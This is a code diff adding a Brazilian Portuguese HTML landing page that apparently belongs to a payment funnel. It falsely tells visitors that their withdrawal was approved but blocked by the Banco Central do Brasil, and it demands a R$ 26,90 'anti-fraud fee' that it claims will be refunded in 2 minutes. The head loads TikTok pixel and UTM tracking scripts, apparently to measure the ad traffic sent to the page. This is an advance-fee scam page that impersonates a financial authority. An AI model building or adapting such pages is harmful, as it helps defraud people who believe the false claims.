@@ -1,0 +1,156 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1" />
+    <title>Pagamento 3</title>
+    <link
+      rel="stylesheet"
+      href="https://fonts.googleapis.com/css2?family=Inter:wght@400;700&display=swap"
+    />
+    <!-- TikTok Pixel Code Start -->
+    <script>
+      window.tikTokPixelId = "6940cb80540addb695fac48e";
+      var a = document.createElement("script");
+      a.setAttribute("async", "");
+      a.setAttribute("defer", "");
+      a.setAttribute("src", "https://cdn.utmify.com.br/scripts/pixel/pixel-tiktok.js");
+      document.head.appendChild(a);
+    </script>
+    <script
+    src="https://cdn.jsdelivr.net/gh/xTracky/static@latest/utm-handler.js"
+    data-token="b8dd940a-6d15-41a7-93d5-1df862b9cca6"
+>
+</script>
+    <!-- TikTok Pixel Code End -->
+
+    <style>
+      body {
+        font-family: "Inter", sans-serif;
+        margin: 0;
+        padding: 0;
+        background-color: #f4f6f9;
+        color: #333;
+        text-align: center;
+      }
+
+      header {
+        background-color: #0eab3f;
+        color: #fff;
+        padding: 1rem 0;
+      }
+
+      header h1 {
+        margin: 0;
+        font-size: 1.5rem;
+      }
+
+      .content {
+        max-width: 600px;
+        margin: 2rem auto;
+        padding: 1rem;
+        background: #fff;
+        border-radius: 8px;
+        box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
+      }
+
+      .content img {
+        width: 100px;
+        margin: 1rem 0;
+      }
+
+      .content h2 {
+        font-size: 1.8rem;
+        color: #0eab3f;
+        margin-bottom: 1rem;
+      }
+
+      .content p {
+        line-height: 1.6;
+      }
+
+      .content .highlight {
+        font-weight: bold;
+        color: #0eab3f;
+      }
+
+      .button {
+        display: inline-block;
+        margin-top: 1.5rem;
+        padding: 0.8rem 1.5rem;
+        font-size: 1rem;
+        font-weight: bold;
+        color: #fff;
+        background: #0eab3f;
+        border: none;
+        border-radius: 25px;
+        text-decoration: none;
+        transition: background 0.3s;
+      }
+
+      .button:hover {
+        background: #09912e;
+      }
+
+      footer {
+        margin-top: 2rem;
+        font-size: 0.9rem;
+        color: #666;
+      }
+
+      @media (max-width: 480px) {
+        header h1 {
+          font-size: 1.2rem;
+        }
+
+        .content h2 {
+          font-size: 1.5rem;
+        }
+
+        .content {
+          padding: 1rem;
+        }
+      }
+    </style>
+  </head>
+  <body>
+    <header>
+      <h1>ATENÇÃO</h1>
+    </header>
+
+    <div class="content">
+      <img src="images/logo-pix-icone-1024.png" alt="Logo Pix" />
+      <h2>Saque aprovado com sucesso!</h2>
+      <p>
+        <strong>Seu saldo foi enviado</strong>, mas a transferência foi
+        interrompida pelo
+        <span class="highlight">Banco Central do Brasil</span>.
+      </p>
+      <p>
+        Para garantir a segurança e evitar fraudes, é necessário pagar uma
+        <span class="highlight">tarifa simbólica anti-fraude</span>. Este valor
+        será extornado em até <strong>2 minutos</strong> após o pagamento.
+      </p>
+      <p>
+        <strong>Valor da tarifa:</strong>
+        <span class="highlight">R$ 26,90</span>
+      </p>
+      <button onclick="redirectToPayment()" class="button">
+        Pagar Tarifa e Desbloquear Saldo
+      </button>
+    </div>
+
+    <script>
+      function redirectToPayment() {
+        const urlParams = new URLSearchParams(window.location.search);
+        const queryString = urlParams.toString();
+        window.location.href =
+          "pagamento/index.html" + (queryString ? "?" + queryString : "");
+      }
+    </script>
+
+    <footer>
+      <p>© 2024 Pagamento Seguro. Todos os direitos reservados.</p>
+    </footer>
+  </body>
+</html>
